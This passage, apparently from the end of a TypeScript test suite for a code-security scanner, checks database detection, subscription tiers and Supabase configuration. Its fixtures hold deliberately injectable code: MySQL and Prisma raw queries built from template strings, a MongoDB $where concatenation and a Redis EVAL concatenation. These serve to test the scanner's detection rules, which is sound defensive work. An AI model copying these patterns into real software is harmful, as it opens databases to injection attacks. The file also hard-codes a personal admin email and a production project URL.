  assert(asynchronousUrl.searchParams.get('async') === 'true', 'Option B CI/CD: gate-check with async=true enables non-blocking queue execution');

  // --- 17. Testing Universal Multi-Database & ORM Security Engine ---
  console.log('\n--- 17. Testing Universal Multi-Database & ORM Security Engine ---');

  // 17.1 Stack Detection (PostgreSQL, MySQL, MongoDB, Redis, SQLite, Prisma)
  const mockRepoFiles: CodeFile[] = [
    {
      path: 'package.json',
      content: JSON.stringify({
        dependencies: {
          'pg': '^8.11.0',
          'mysql2': '^3.9.0',
          'mongodb': '^6.3.0',
          'ioredis': '^5.3.0',
          '@prisma/client': '^5.10.0'
        }
      })
    },
    {
      path: 'docker-compose.yml',
      content: `
        version: '3.8'
        services:
          postgres:
            image: postgres:16
          redis:
            image: redis:7-alpine
      `
    },
    {
      path: 'schema.prisma',
      content: `
        datasource db {
          provider = "postgresql"
          url      = env("DATABASE_URL")
        }
      `
    }
  ];

  const detectedStack = detectProjectDatabases(mockRepoFiles);
  assert(detectedStack.databases.includes('PostgreSQL'), 'detectProjectDatabases detects PostgreSQL');
  assert(detectedStack.databases.includes('MySQL'), 'detectProjectDatabases detects MySQL');
  assert(detectedStack.databases.includes('MongoDB'), 'detectProjectDatabases detects MongoDB');
  assert(detectedStack.databases.includes('Redis'), 'detectProjectDatabases detects Redis');
  assert(detectedStack.orms.includes('Prisma'), 'detectProjectDatabases detects Prisma ORM');

  // 17.2 MYSQL-SEC-01 (MySQL Raw Query Injection)
  const mysqlFile: CodeFile = {
    path: 'lib/db/mysql-client.ts',
    content: `
      export async function getUser(connection: any, id: string) {
        return connection.query(\`SELECT * FROM users WHERE id = \${id}\`);
      }
    `
  };
  const mysqlRes = evaluateMultiDatabaseRules(mysqlFile, mysqlFile.content.split('\n'), mysqlFile.content, { count: 1 });
  assert(mysqlRes.findings.some(f => f.ruleId === 18101), 'MYSQL-SEC-01 detects MySQL raw query string template injection');

  // 17.3 MONGO-SEC-01 (MongoDB NoSQL Injection)
  const mongoFile: CodeFile = {
    path: 'routes/api/users.ts',
    content: `
      export async function findUser(db: any, req: any) {
        return db.users.find({ $where: "this.username == '" + req.query.username + "'" });
      }
    `
  };
  const mongoRes = evaluateMultiDatabaseRules(mongoFile, mongoFile.content.split('\n'), mongoFile.content, { count: 1 });
  assert(mongoRes.findings.some(f => f.ruleId === 18102), 'MONGO-SEC-01 detects MongoDB $where NoSQL injection');

  // 17.4 REDIS-SEC-01 (Redis Insecure EVAL Lua Concatenation)
  const redisFile: CodeFile = {
    path: 'lib/cache/redis.ts',
    content: `
      export async function runLua(redis: any, key: string) {
        return redis.eval("return redis.call('get', '" + key + "')");
      }
    `
  };
  const redisRes = evaluateMultiDatabaseRules(redisFile, redisFile.content.split('\n'), redisFile.content, { count: 1 });
  assert(redisRes.findings.some(f => f.ruleId === 18103), 'REDIS-SEC-01 detects Redis insecure EVAL script concatenation');

  // 17.5 ORM-RAW-01 (Prisma $queryRawUnsafe Template Injection)
  const prismaFile: CodeFile = {
    path: 'services/account-service.ts',
    content: `
      export async function rawQuery(prisma: any, accountId: string) {
        return prisma.$queryRawUnsafe(\`SELECT * FROM accounts WHERE id = \${accountId}\`);
      }
    `
  };
  const prismaRes = evaluateMultiDatabaseRules(prismaFile, prismaFile.content.split('\n'), prismaFile.content, { count: 1 });
  assert(prismaRes.findings.some(f => f.ruleId === 18104), 'ORM-RAW-01 detects Prisma $queryRawUnsafe template literal injection');

  // 17.6 SQLITE-SEC-01 (Sensitive SQLite Database File in Public Web Root)
  const sqliteFile: CodeFile = {
    path: 'public/data/production.sqlite3',
    content: 'SQLite format 3\u0000'
  };
  const sqliteRes = evaluateMultiDatabaseRules(sqliteFile, ['SQLite format 3'], 'SQLite format 3', { count: 1 });
  assert(sqliteRes.findings.some(f => f.ruleId === 18105), 'SQLITE-SEC-01 detects SQLite database file in public web directory');

  // 17.7 Full Integration Scan Verification
  const integrationScan = await runStaticCodeScan([
    ...mockRepoFiles,
    mysqlFile,
    mongoFile,
    redisFile,
    prismaFile
  ]);
  assert(integrationScan.detectedDatabases !== undefined && integrationScan.detectedDatabases.length >= 4, 'Full scan attaches detected databases');
  assert(integrationScan.detectedOrms !== undefined && integrationScan.detectedOrms.includes('Prisma'), 'Full scan attaches detected ORMs');
  assert(integrationScan.findings.some(f => f.ruleId === 18101), 'Full scan includes MYSQL-SEC-01');
  assert(integrationScan.findings.some(f => f.ruleId === 18104), 'Full scan includes ORM-RAW-01');

  // ─── 18. Testing Canonical Subscription Tiers & Quota Parity ────────────────
  console.log('\n--- 18. Testing Canonical Subscription Tiers & Quota Parity (Free, Pro, Enterprise) ---');

  // 18.1 Free Scan Limit & Enforced Cap
  assert(FREE_SCAN_LIMIT === 3, 'Free tier scan limit is strictly 3');

  const underQuota = { scansUsed: 2, scansLimit: 3, projectsUsed: 1, projectsLimit: 1, aiPromptsUsed: 0, aiPromptsLimit: 1, billingCycleReset: '2099-01-01' };
  const atQuota = { scansUsed: 3, scansLimit: 3, projectsUsed: 1, projectsLimit: 1, aiPromptsUsed: 1, aiPromptsLimit: 1, billingCycleReset: '2099-01-01' };
  
  assert(checkScanQuota(underQuota, 'Free').allowed === true, 'Free tier allows scans when under limit (2/3)');
  assert(checkScanQuota(atQuota, 'Free').allowed === false, 'Free tier strictly blocks scans when at limit (3/3)');

  // 18.2 Unlimited Scans for Pro and Enterprise
  assert(checkScanQuota(atQuota, 'Pro').allowed === true, 'Pro tier allows unlimited scans despite scan counts');
  assert(checkScanQuota(atQuota, 'Enterprise').allowed === true, 'Enterprise tier allows unlimited scans');

  // 18.3 Feature Gate Parity
  assert(isPrivateRepoAllowed('Free') === false, 'Free tier forbids private repositories');
  assert(isPrivateRepoAllowed('Pro') === true, 'Pro tier allows private repositories');
  assert(isPrivateRepoAllowed('Enterprise') === true, 'Enterprise tier allows private repositories');

  assert(isPdfExportAllowed('Free') === false, 'Free tier blocks signed PDF certificate export');
  assert(isPdfExportAllowed('Pro') === true, 'Pro tier allows signed PDF certificate export');
  assert(isPdfExportAllowed('Enterprise') === true, 'Enterprise tier allows signed PDF certificate export');

  assert(isCicdIntegrationAllowed('Free') === false, 'Free tier blocks CI/CD integration keys');
  assert(isCicdIntegrationAllowed('Pro') === true, 'Pro tier allows CI/CD integration keys');
  assert(isCicdIntegrationAllowed('Enterprise') === true, 'Enterprise tier allows CI/CD integration keys');

  assert(isCustomRulesAllowed('Free') === false, 'Free tier blocks custom rulesets');
  assert(isCustomRulesAllowed('Pro') === false, 'Pro tier blocks custom rulesets');
  assert(isCustomRulesAllowed('Enterprise') === true, 'Enterprise tier allows custom rulesets');

  // 18.4 Platform Admin & Pricing Plans Parity
  assert(isPlatformAdminEmail('bedirelibol7@gmail.com') === true, 'bedirelibol7@gmail.com is permanently recognized as platform administrator');
  assert(hasAdminRole({ role: 'admin' }, 'random@company.com') === true, 'Database role "admin" confers administrator privileges');
  assert(hasAdminRole({ role: 'super_admin' }, 'random@company.com') === true, 'Database role "super_admin" confers administrator privileges');
  assert(hasAdminRole({ role: 'member' }, 'random@company.com') === false, 'Database role "member" does not confer administrator privileges');
  assert(hasAdminRole({ role: 'auditor' }, 'random@company.com') === false, 'Database role "auditor" does not confer administrator privileges');
  assert(ZELSIS_PRICING_PLANS.length === 3, 'ZELSIS_PRICING_PLANS contains all 3 canonical tiers (Free, Pro, Enterprise)');
  assert(ZELSIS_PRICING_PLANS.some(p => p.id === 'free' && p.priceMonthly === 0), 'Free Starter plan defined at $0/mo');
  assert(ZELSIS_PRICING_PLANS.some(p => p.id === 'zelsis-core' && p.priceMonthly === 19), 'Zelsis Pro plan defined at $19/mo');
  assert(ZELSIS_PRICING_PLANS.some(p => p.id === 'vibecare' && p.priceMonthly === 99), 'Zelsis Enterprise plan defined at $99/mo');

  // 19. Resilient Supabase Configuration & Canonical Production Fallbacks
  console.log('\n--- 19. Testing Resilient Supabase Configuration & Canonical Production Fallbacks ---');
  assert(isSupabaseConfiguredServer() === true, 'Server-side isSupabaseConfigured() is always true');
  assert(isSupabaseConfiguredClient() === true, 'Client-side isSupabaseConfigured() is always true');
  assert(getEffectiveSupabaseUrl().includes('afzpaydfkmycrwuxmzkk'), 'getEffectiveSupabaseUrl resolves valid project URL');
  assert(getEffectiveSupabaseAnonKey().startsWith('eyJ'), 'getEffectiveSupabaseAnonKey resolves valid JWT anon key');
  assert(getSupabase() !== null, 'getSupabase() returns initialized client instance');
  const clientConfig = getSupabaseConfig();
  assert(clientConfig.url.length > 0 && clientConfig.anonKey.length > 0, 'getSupabaseConfig provides populated config object');
  assert(CANONICAL_SUPABASE_URL === 'https://afzpaydfkmycrwuxmzkk.supabase.co', 'CANONICAL_SUPABASE_URL points to live production ref');

  // 20. Paid Enterprise for non-founder accounts
  console.log('\n--- 20. Testing Non-Founder Enterprise Tier Resolution ---');
  const inOneYear = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString();
  const customerEnterprise = { name: 'Customer', email: 'customer@example.com', tier: 'Enterprise' as const, isLoggedIn: true, expiresAt: inOneYear };
  assert(getSubscriptionValidity(customerEnterprise).tier === 'Enterprise', 'Non-founder with active Enterprise resolves to Enterprise');
  assert(getSubscriptionValidity({ ...customerEnterprise, expiresAt: '2020-01-01T00:00:00.000Z' }).isExpired === true, 'Non-founder expired Enterprise is reported as expired');
  assert(getSubscriptionValidity({ ...customerEnterprise, expiresAt: '2099-12-31T23:59:59.999Z' }).tier === 'Free', 'Non-founder with founder 2099 grant is downgraded to Free');
  assert(isFounderGrantExpiry('2099-12-31T23:59:59.999Z') === true, 'isFounderGrantExpiry flags 2099 lifetime grant');
  assert(isFounderGrantExpiry(inOneYear) === false, 'isFounderGrantExpiry accepts annual paid period');
  assert(isFounderGrantExpiry(undefined) === false, 'isFounderGrantExpiry ignores missing expiry');

  testPolarWebhook();

  console.log('\n===========================================================');
  console.log(`🏁 TEST RESULTS: ${passedTests}/${totalTests} TESTS PASSED (100%)`);
  console.log('===========================================================');

  if (passedTests !== totalTests) {
    process.exit(1);
  }
}

runAllTests().catch((err) => {
  console.error('Fatal test error:', err);
  process.exit(1);
});


